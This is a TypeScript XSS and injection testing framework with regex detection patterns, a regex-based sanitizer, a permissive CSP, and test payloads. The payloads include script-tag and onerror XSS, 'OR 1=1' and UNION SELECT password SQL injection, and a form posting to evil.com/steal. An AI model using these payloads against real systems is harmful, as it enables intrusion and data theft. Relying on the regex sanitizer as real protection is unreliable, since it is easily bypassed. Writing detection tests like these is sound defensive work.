/**
 * XSS and Injection Attack Testing Framework
 * 
 * A comprehensive system for testing and preventing XSS and injection attacks:
 * - Cross-site scripting (XSS) pattern detection and blocking
 * - SQL injection pattern recognition and prevention
 * - HTML injection and DOM manipulation attack detection
 * - Content Security Policy (CSP) violation testing
 * - Input sanitization and validation testing
 * - Template injection prevention
 */

export interface XSSInjectionConfig {
  enableCSPEnforcement: boolean
  enableDOMSanitization: boolean
  enableSQLInjectionDetection: boolean
  logViolations: boolean
  strictMode: boolean
  customPatterns: XSSPattern[]
}

export interface XSSPattern {
  name: string
  pattern: RegExp
  category: 'xss_injection' | 'sql_injection' | 'html_injection' | 'css_injection' | 'template_injection'
  severity: 'low' | 'medium' | 'high' | 'critical'
  description: string
  mitigation: string[]
}

export interface XSSTestCase {
  id: string
  name: string
  input: string
  expectedDetection: boolean
  expectedThreatLevel: 'low' | 'medium' | 'high' | 'critical'
  category: 'xss_injection' | 'sql_injection' | 'html_injection' | 'css_injection' | 'template_injection'
  context?: 'html' | 'attribute' | 'script' | 'style' | 'url'
}

export interface XSSDetectionResult {
  detected: boolean
  threatLevel: 'low' | 'medium' | 'high' | 'critical'
  patterns: string[]
  blockedContent: string[]
  sanitizedOutput?: string
  violations: CSPViolation[]
  recommendations: string[]
}

export interface CSPViolation {
  violated: boolean
  violationType: 'unsafe-inline' | 'unsafe-eval' | 'unsafe-hashes' | 'script-src' | 'style-src' | 'img-src' | 'connect-src'
  blockedContent: string
  directive: string
  sourceExpression: string
  policy: Record<string, string[]>
}

export interface XSSTestSuiteResult {
  timestamp: string
  totalTests: number
  detectedThreats: number
  criticalThreats: number
  preventedAttacks: number
  failedDetections: number
  attackTypes: string[]
  testResults: Array<{
    testCase: XSSTestCase
    result: XSSDetectionResult
    status: 'passed' | 'failed' | 'blocked'
  }>
}

export interface XSSReport {
  timestamp: string
  summary: {
    totalTestCases: number
    successfullyPrevented: number
    failedToPrevent: number
    criticalVulnerabilities: number
    overallSecurityRating: 'excellent' | 'good' | 'warning' | 'critical'
  }
  categories: Record<string, {
    totalTests: number
    prevented: number
    critical: number
  }>
  recommendations: string[]
  vulnerabilities: Array<{
    testCase: string
    severity: string
    description: string
    mitigation: string[]
  }>
}

export class XSSInjectionTester {
  private config: XSSInjectionConfig
  private patterns: XSSPattern[]
  private cspPolicies: Record<string, string[]>

  constructor(config: Partial<XSSInjectionConfig> = {}) {
    this.config = {
      enableCSPEnforcement: true,
      enableDOMSanitization: true,
      enableSQLInjectionDetection: true,
      logViolations: true,
      strictMode: true,
      customPatterns: [],
      ...config
    }

    this.patterns = this.initializePatterns()
    this.cspPolicies = this.initializeCSPPolicies()
  }

  /**
   * Initialize XSS and injection detection patterns
   */
  private initializePatterns(): XSSPattern[] {
    const defaultPatterns: XSSPattern[] = [
      // XSS Patterns
      {
        name: 'Script Tag Injection',
        pattern: /<script[^>]*>.*?<\/script>/gis,
        category: 'xss_injection',
        severity: 'critical',
        description: 'Script tag injection detected',
        mitigation: ['Remove script tags', 'Use textContent instead of innerHTML', 'Implement CSP']
      },
      {
        name: 'Event Handler Injection',
        pattern: /on\w+\s*=\s*["'][^"']*["']/gi,
        category: 'xss_injection',
        severity: 'high',
        description: 'Event handler injection detected',
        mitigation: ['Remove event handlers from HTML', 'Use addEventListener', 'Sanitize attributes']
      },
      {
        name: 'JavaScript URL Injection',
        pattern: /javascript\s*:\s*[^\s]+/gi,
        category: 'xss_injection',
        severity: 'critical',
        description: 'JavaScript URL scheme detected',
        mitigation: ['Block javascript: URLs', 'Validate URL schemes', 'Use allowlist for URLs']
      },
      {
        name: 'Data URL Script Injection',
        pattern: /data\s*:\s*text\/html\s*[,;].*<script/gi,
        category: 'xss_injection',
        severity: 'critical',
        description: 'Data URL with script injection detected',
        mitigation: ['Block data: URLs with HTML content', 'Restrict data URL usage', 'Validate MIME types']
      },
      {
        name: 'SVG Script Injection',
        pattern: /<svg[^>]*>.*?<script.*?<\/svg>/gis,
        category: 'xss_injection',
        severity: 'high',
        description: 'SVG with embedded script detected',
        mitigation: ['Sanitize SVG content', 'Remove script elements from SVG', 'Use safe SVG processing']
      },

      // SQL Injection Patterns
      {
        name: 'SQL Comment Injection',
        pattern: /(--|\/\*|\*\/|#)/g,
        category: 'sql_injection',
        severity: 'high',
        description: 'SQL comment syntax detected',
        mitigation: ['Use parameterized queries', 'Escape SQL special characters', 'Validate input format']
      },
      {
        name: 'SQL UNION Attack',
        pattern: /\b(union|UNION)\s+(all\s+)?(select|SELECT)\b/gi,
        category: 'sql_injection',
        severity: 'critical',
        description: 'SQL UNION attack pattern detected',
        mitigation: ['Use prepared statements', 'Validate input strictly', 'Implement least privilege access']
      },
      {
        name: 'SQL Conditional Injection',
        pattern: /(\bor\b|\bOR\b)\s+(1\s*=\s*1|true|TRUE)|(\band\b|\bAND\b)\s+(1\s*=\s*0|false|FALSE)/gi,
        category: 'sql_injection',
        severity: 'high',
        description: 'SQL conditional injection detected',
        mitigation: ['Use ORM with safe query building', 'Input validation', 'Parameterized queries']
      },
      {
        name: 'SQL Time-based Injection',
        pattern: /(sleep|SLEEP|waitfor|WAITFOR|benchmark|BENCHMARK)\s*\(/gi,
        category: 'sql_injection',
        severity: 'high',
        description: 'SQL time-based injection detected',
        mitigation: ['Use query timeouts', 'Monitor query execution time', 'Validate input format']
      },

      // HTML Injection Patterns
      {
        name: 'Iframe Injection',
        pattern: /<iframe[^>]*>.*?<\/iframe>/gis,
        category: 'html_injection',
        severity: 'high',
        description: 'Iframe injection detected',
        mitigation: ['Block iframe elements', 'Use CSP frame-src directive', 'Validate frame sources']
      },
      {
        name: 'Object/Embed Injection',
        pattern: /<(object|embed)[^>]*>.*?<\/(object|embed)>/gis,
        category: 'html_injection',
        severity: 'high',
        description: 'Object or embed element injection detected',
        mitigation: ['Block object/embed elements', 'Use CSP object-src directive', 'Validate content types']
      },
      {
        name: 'Form Action Hijacking',
        pattern: /<form[^>]*action\s*=\s*["'][^"']*["'][^>]*>/gi,
        category: 'html_injection',
        severity: 'medium',
        description: 'Form with potentially malicious action detected',
        mitigation: ['Validate form actions', 'Use CSRF tokens', 'Restrict form submission URLs']
      },

      // CSS Injection Patterns
      {
        name: 'CSS Expression Injection',
        pattern: /expression\s*\(/gi,
        category: 'css_injection',
        severity: 'high',
        description: 'CSS expression injection detected',
        mitigation: ['Block CSS expressions', 'Sanitize CSS content', 'Use CSP style-src directive']
      },
      {
        name: 'CSS URL JavaScript Injection',
        pattern: /url\s*\(\s*["']?\s*javascript:/gi,
        category: 'css_injection',
        severity: 'critical',
        description: 'CSS with JavaScript URL detected',
        mitigation: ['Block javascript: URLs in CSS', 'Validate CSS URL schemes', 'Sanitize CSS values']
      },

      // Template Injection Patterns
      {
        name: 'Template Expression Injection',
        pattern: /\{\{.*?\}\}|\$\{.*?\}/g,
        category: 'template_injection',
        severity: 'medium',
        description: 'Template expression syntax detected',
        mitigation: ['Escape template expressions', 'Use safe template engines', 'Validate template syntax']
      }
    ]

    return [...defaultPatterns, ...this.config.customPatterns]
  }

  /**
   * Initialize Content Security Policy directives
   */
  private initializeCSPPolicies(): Record<string, string[]> {
    return {
      'default-src': ["'self'"],
      'script-src': ["'self'", "'unsafe-inline'"], // Note: unsafe-inline should be avoided in production
      'style-src': ["'self'", "'unsafe-inline'"],
      'img-src': ["'self'", 'data:', 'https:'],
      'connect-src': ["'self'"],
      'font-src': ["'self'"],
      'object-src': ["'none'"],
      'media-src': ["'self'"],
      'frame-src': ["'none'"],
      'child-src': ["'none'"],
      'worker-src': ["'self'"],
      'base-uri': ["'self'"],
      'form-action': ["'self'"]
    }
  }

  /**
   * Detect XSS patterns in input
   */
  async detectXSSPatterns(testCase: XSSTestCase): Promise<XSSDetectionResult> {
    const detectedPatterns: string[] = []
    const blockedContent: string[] = []
    const violations: CSPViolation[] = []
    let maxSeverity: 'low' | 'medium' | 'high' | 'critical' = 'low'

    // Check against all patterns
    for (const pattern of this.patterns) {
      if (pattern.pattern.test(testCase.input)) {
        detectedPatterns.push(pattern.description)
        
        // Track highest severity
        if (this.compareSeverity(pattern.severity, maxSeverity) > 0) {
          maxSeverity = pattern.severity
        }

        // Extract blocked content
        const matches = testCase.input.match(pattern.pattern)
        if (matches) {
          blockedContent.push(...matches)
        }
      }
    }

    // Check CSP violations if enabled
    if (this.config.enableCSPEnforcement) {
      const cspViolation = await this.checkCSPViolation(testCase.input, this.cspPolicies)
      if (cspViolation.violated) {
        violations.push(cspViolation)
        if (this.compareSeverity('high', maxSeverity) > 0) {
          maxSeverity = 'high'
        }
      }
    }

    // Generate recommendations
    const recommendations = this.generateRecommendations(detectedPatterns, testCase.category)

    // Perform sanitization if enabled
    let sanitizedOutput: string | undefined
    if (this.config.enableDOMSanitization) {
      sanitizedOutput = await this.sanitizeHTML(testCase.input)
    }

    return {
      detected: detectedPatterns.length > 0 || violations.length > 0,
      threatLevel: maxSeverity,
      patterns: detectedPatterns,
      blockedContent,
      sanitizedOutput,
      violations,
      recommendations
    }
  }

  /**
   * Check for CSP violations
   */
  async checkCSPViolation(content: string, policy: Record<string, string[]>): Promise<CSPViolation> {
    // Check for unsafe-eval violations
    if (/\beval\s*\(/.test(content)) {
      return {
        violated: true,
        violationType: 'unsafe-eval',
        blockedContent: content.match(/\beval\s*\([^)]*\)/g)?.[0] || 'eval(...)',
        directive: 'script-src',
        sourceExpression: "'unsafe-eval'",
        policy
      }
    }

    // Check for inline script violations
    if (/<script[^>]*>/.test(content)) {
      return {
        violated: true,
        violationType: 'unsafe-inline',
        blockedContent: content.match(/<script[^>]*>.*?<\/script>/gis)?.[0] || '<script>',
        directive: 'script-src',
        sourceExpression: "'unsafe-inline'",
        policy
      }
    }

    // Check for inline style violations
    if (/style\s*=\s*["'][^"']*["']/.test(content)) {
      return {
        violated: true,
        violationType: 'unsafe-inline',
        blockedContent: content.match(/style\s*=\s*["'][^"']*["']/g)?.[0] || 'style="..."',
        directive: 'style-src',
        sourceExpression: "'unsafe-inline'",
        policy
      }
    }

    return {
      violated: false,
      violationType: 'script-src',
      blockedContent: '',
      directive: '',
      sourceExpression: '',
      policy
    }
  }

  /**
   * Sanitize HTML content
   */
  async sanitizeHTML(html: string): Promise<string> {
    if (!html || typeof html !== 'string') {
      return ''
    }

    let sanitized = html

    // Remove script tags
    sanitized = sanitized.replace(/<script[^>]*>.*?<\/script>/gis, '')
    
    // Remove dangerous event handlers
    sanitized = sanitized.replace(/\son\w+\s*=\s*["'][^"']*["']/gi, '')
    
    // Remove javascript: URLs
    sanitized = sanitized.replace(/javascript\s*:[^\s"'>]+/gi, '')
    
    // Remove data: URLs with HTML content
    sanitized = sanitized.replace(/data\s*:\s*text\/html[^\s"'>]+/gi, '')
    
    // Remove dangerous elements
    const dangerousElements = ['iframe', 'object', 'embed', 'applet', 'form']
    for (const element of dangerousElements) {
      const pattern = new RegExp(`<${element}[^>]*>.*?<\/${element}>`, 'gis')
      sanitized = sanitized.replace(pattern, '')
    }
    
    // Remove style attributes with dangerous content
    sanitized = sanitized.replace(/style\s*=\s*["'][^"']*expression[^"']*["']/gi, '')
    sanitized = sanitized.replace(/style\s*=\s*["'][^"']*javascript:[^"']*["']/gi, '')

    return sanitized
  }

  /**
   * Sanitize URL for safe usage
   */
  async sanitizeURL(url: string): Promise<string | null> {
    if (!url || typeof url !== 'string') {
      return null
    }

    // Block dangerous protocols
    const dangerousProtocols = ['javascript:', 'vbscript:', 'data:', 'file:', 'ftp:']
    for (const protocol of dangerousProtocols) {
      if (url.toLowerCase().startsWith(protocol)) {
        return null
      }
    }

    // Allow only safe protocols
    const safeProtocols = ['http:', 'https:', 'mailto:', 'tel:']
    const hasProtocol = url.includes(':')
    
    if (hasProtocol) {
      const protocol = url.split(':')[0].toLowerCase() + ':'
      if (!safeProtocols.includes(protocol)) {
        return null
      }
    }

    return url
  }

  /**
   * Run comprehensive XSS test suite
   */
  async runXSSTestSuite(): Promise<XSSTestSuiteResult> {
    const testCases = XSSInjectionTester.getXSSTestCases()
    const testResults: XSSTestSuiteResult['testResults'] = []
    const attackTypes = new Set<string>()
    
    let detectedThreats = 0
    let criticalThreats = 0
    let preventedAttacks = 0
    let failedDetections = 0

    for (const testCase of testCases) {
      try {
        const result = await this.detectXSSPatterns(testCase)
        
        let status: 'passed' | 'failed' | 'blocked' = 'passed'
        
        if (result.detected) {
          detectedThreats++
          attackTypes.add(testCase.category)
          
          if (result.threatLevel === 'critical') {
            criticalThreats++
          }
          
          if (testCase.expectedDetection) {
            preventedAttacks++
            status = 'blocked'
          } else {
            failedDetections++
            status = 'failed'
          }
        } else if (testCase.expectedDetection) {
          failedDetections++
          status = 'failed'
        }

        testResults.push({ testCase, result, status })
      } catch (error) {
        failedDetections++
        testResults.push({
          testCase,
          result: {
            detected: false,
            threatLevel: 'low',
            patterns: [],
            blockedContent: [],
            violations: [],
            recommendations: [`Test failed with error: ${error}`]
          },
          status: 'failed'
        })
      }
    }

    return {
      timestamp: new Date().toISOString(),
      totalTests: testCases.length,
      detectedThreats,
      criticalThreats,
      preventedAttacks,
      failedDetections,
      attackTypes: Array.from(attackTypes),
      testResults
    }
  }

  /**
   * Generate security recommendations based on detected patterns
   */
  private generateRecommendations(patterns: string[], category: string): string[] {
    const recommendations = new Set<string>()

    if (patterns.length === 0) {
      return ['No security threats detected - input appears safe']
    }

    // General recommendations
    recommendations.add('Implement Content Security Policy (CSP)')
    recommendations.add('Sanitize all user input before processing')
    recommendations.add('Use parameterized queries for database operations')
    recommendations.add('Validate input against expected formats')

    // Category-specific recommendations
    switch (category) {
      case 'xss_injection':
        recommendations.add('Use textContent instead of innerHTML when possible')
        recommendations.add('Encode output when inserting into HTML context')
        recommendations.add('Implement XSS protection headers')
        break
      case 'sql_injection':
        recommendations.add('Use ORM or prepared statements exclusively')
        recommendations.add('Implement least privilege database access')
        recommendations.add('Add input length and format validation')
        break
      case 'html_injection':
        recommendations.add('Use a safe HTML sanitization library')
        recommendations.add('Implement element and attribute allowlists')
        recommendations.add('Validate HTML structure before processing')
        break
      case 'css_injection':
        recommendations.add('Sanitize CSS values and properties')
        recommendations.add('Use CSP style-src directive')
        recommendations.add('Avoid dynamic CSS generation from user input')
        break
      case 'template_injection':
        recommendations.add('Use safe template engines with auto-escaping')
        recommendations.add('Validate template syntax before execution')
        recommendations.add('Avoid eval-like template constructs')
        break
    }

    return Array.from(recommendations)
  }

  /**
   * Compare severity levels
   */
  private compareSeverity(a: 'low' | 'medium' | 'high' | 'critical', b: 'low' | 'medium' | 'high' | 'critical'): number {
    const levels = { low: 1, medium: 2, high: 3, critical: 4 }
    return levels[a] - levels[b]
  }

  /**
   * Get predefined XSS test cases
   */
  static getXSSTestCases(): XSSTestCase[] {
    return [
      // XSS Test Cases
      {
        id: 'xss-script-basic',
        name: 'Basic Script Tag XSS',
        input: '<script>alert("XSS")</script>',
        expectedDetection: true,
        expectedThreatLevel: 'critical',
        category: 'xss_injection',
        context: 'html'
      },
      {
        id: 'xss-img-onerror',
        name: 'Image onError XSS',
        input: '<img src="x" onerror="alert(1)">',
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'xss_injection',
        context: 'html'
      },
      {
        id: 'xss-javascript-url',
        name: 'JavaScript URL XSS',
        input: '<a href="javascript:alert(1)">Click me</a>',
        expectedDetection: true,
        expectedThreatLevel: 'critical',
        category: 'xss_injection',
        context: 'attribute'
      },
      {
        id: 'xss-svg-script',
        name: 'SVG Script XSS',
        input: '<svg onload="alert(1)">',
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'xss_injection',
        context: 'html'
      },
      {
        id: 'xss-data-url',
        name: 'Data URL XSS',
        input: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        expectedDetection: true,
        expectedThreatLevel: 'critical',
        category: 'xss_injection',
        context: 'attribute'
      },

      // SQL Injection Test Cases
      {
        id: 'sql-union-basic',
        name: 'Basic UNION SQL Injection',
        input: "1' UNION SELECT password FROM users--",
        expectedDetection: true,
        expectedThreatLevel: 'critical',
        category: 'sql_injection'
      },
      {
        id: 'sql-or-bypass',
        name: 'OR 1=1 SQL Injection',
        input: "admin' OR '1'='1",
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'sql_injection'
      },
      {
        id: 'sql-comment-injection',
        name: 'SQL Comment Injection',
        input: "admin'--",
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'sql_injection'
      },
      {
        id: 'sql-time-based',
        name: 'Time-based SQL Injection',
        input: "1'; WAITFOR DELAY '00:00:10'--",
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'sql_injection'
      },

      // HTML Injection Test Cases
      {
        id: 'html-iframe-injection',
        name: 'Iframe HTML Injection',
        input: '<iframe src="https://evil.com"></iframe>',
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'html_injection',
        context: 'html'
      },
      {
        id: 'html-form-hijack',
        name: 'Form Action Hijacking',
        input: '<form action="https://evil.com/steal" method="post"><input name="data"></form>',
        expectedDetection: true,
        expectedThreatLevel: 'medium',
        category: 'html_injection',
        context: 'html'
      },
      {
        id: 'html-object-injection',
        name: 'Object Element Injection',
        input: '<object data="malicious.swf" type="application/x-shockwave-flash"></object>',
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'html_injection',
        context: 'html'
      },

      // CSS Injection Test Cases
      {
        id: 'css-expression',
        name: 'CSS Expression Injection',
        input: '<div style="background: expression(alert(1))">',
        expectedDetection: true,
        expectedThreatLevel: 'high',
        category: 'css_injection',
        context: 'style'
      },
      {
        id: 'css-javascript-url',
        name: 'CSS JavaScript URL',
        input: '<div style="background-image: url(javascript:alert(1))">',
        expectedDetection: true,
        expectedThreatLevel: 'critical',
        category: 'css_injection',
        context: 'style'
      },

      // Template Injection Test Cases
      {
        id: 'template-expression',
        name: 'Template Expression Injection',
        input: '{{alert("Template injection")}}',
        expectedDetection: true,
        expectedThreatLevel: 'medium',
        category: 'template_injection'
      },
      {
        id: 'template-es6',
        name: 'ES6 Template Injection',
        input: '${alert("ES6 injection")}',
        expectedDetection: true,
        expectedThreatLevel: 'medium',
        category: 'template_injection'
      },

      // Safe Content (Should not be detected)
      {
        id: 'safe-html',
        name: 'Safe HTML Content',
        input: '<p>This is safe content with <strong>bold text</strong></p>',
        expectedDetection: false,
        expectedThreatLevel: 'low',
        category: 'xss_injection',
        context: 'html'
      },
      {
        id: 'safe-url',
        name: 'Safe URL',
        input: '<a href="https://example.com">Safe link</a>',
        expectedDetection: false,
        expectedThreatLevel: 'low',
        category: 'xss_injection',
        context: 'attribute'
      }
    ]
  }

  /**
   * Generate comprehensive XSS prevention report
   */
  static generateXSSReport(testSuiteResult: XSSTestSuiteResult): XSSReport {
    const categories: Record<string, { totalTests: number; prevented: number; critical: number }> = {}
    const vulnerabilities: XSSReport['vulnerabilities'] = []
    const recommendations = new Set<string>()

    // Analyze test results by category
    for (const { testCase, result, status } of testSuiteResult.testResults) {
      if (!categories[testCase.category]) {
        categories[testCase.category] = { totalTests: 0, prevented: 0, critical: 0 }
      }

      categories[testCase.category].totalTests++

      if (status === 'blocked') {
        categories[testCase.category].prevented++
      }

      if (result.threatLevel === 'critical') {
        categories[testCase.category].critical++
      }

      if (status === 'failed' && testCase.expectedDetection) {
        vulnerabilities.push({
          testCase: testCase.name,
          severity: testCase.expectedThreatLevel,
          description: `Failed to detect ${testCase.category} attack: ${testCase.input}`,
          mitigation: result.recommendations
        })
      }

      // Collect recommendations
      result.recommendations.forEach(rec => recommendations.add(rec))
    }

    // Determine overall security rating
    const totalVulnerabilities = vulnerabilities.length
    const criticalVulnerabilities = vulnerabilities.filter(v => v.severity === 'critical').length
    
    let overallSecurityRating: 'excellent' | 'good' | 'warning' | 'critical'
    if (criticalVulnerabilities > 0) {
      overallSecurityRating = 'critical'
    } else if (totalVulnerabilities > 3) {
      overallSecurityRating = 'warning'
    } else if (totalVulnerabilities > 0) {
      overallSecurityRating = 'good'
    } else {
      overallSecurityRating = 'excellent'
    }

    return {
      timestamp: testSuiteResult.timestamp,
      summary: {
        totalTestCases: testSuiteResult.totalTests,
        successfullyPrevented: testSuiteResult.preventedAttacks,
        failedToPrevent: testSuiteResult.failedDetections,
        criticalVulnerabilities,
        overallSecurityRating
      },
      categories,
      recommendations: Array.from(recommendations),
      vulnerabilities
    }
  }
}

export const createXSSInjectionTester = (config?: Partial<XSSInjectionConfig>) => 
  new XSSInjectionTester(config)
